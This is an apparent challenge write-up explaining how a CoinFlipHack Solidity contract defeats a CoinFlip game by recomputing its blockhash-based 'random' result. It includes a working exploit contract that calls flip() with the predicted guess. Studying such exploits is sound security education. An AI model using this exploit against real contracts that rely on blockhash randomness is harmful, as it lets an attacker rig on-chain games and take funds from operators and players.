# CoinFlipHack Exploit Explanation

CoinFlipHack takes advantage of a vulnerability in the CoinFlip contract by predicting the outcome of the coin flip using the same pseudo-randomness approach, which allows it to gain an unfair advantage in the game. To exploit this vulnerability, the CoinFlipHack contract is first deployed with the address of the CoinFlip contract as a parameter, enabling it to interact with CoinFlip.

Next, the attacker calls the attack() function in the CoinFlipHack contract, and inside this function, the contract retrieves the blockhash of the last block. This blockhash is also used by CoinFlip to determine the flip outcome. CoinFlipHack then calculates the result of the division by FACTOR (a large constant) in the same manner as the CoinFlip contract.

Armed with the division result, CoinFlipHack determines the correct guess (true for heads, false for tails) and proceeds to call the flip() function in the CoinFlip contract using the predicted guess. Since it employs the same logic as the CoinFlip contract to determine the outcome, the guess will be correct.

By repeating the attack() function 10 times, the attacker can achieve 10 consecutive wins in the CoinFlip game. This is possible because the CoinFlipHack contract essentially mirrors the CoinFlip contract's method for determining the flip outcome, exploiting the contract's reliance on the predictable blockhash for randomness.

interface ICoinFlip {
function consecutiveWins() external view returns (uint256);

    function flip(bool) external returns (bool);

}

contract CoinFlipHack {
ICoinFlip private \_coinFlip;
uint256 private lastHash;
uint256 private FACTOR =
57896044618658097711785492504343953926634992332820282019728792003956564819968;
bool public guessSide;

    constructor(address _addr) {
        _coinFlip = ICoinFlip(_addr);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 currentCoinFlip = uint256(uint256(blockValue) / FACTOR);
        guessSide = currentCoinFlip == 1 ? true : false;
        _coinFlip.flip(guessSide);
    }

}
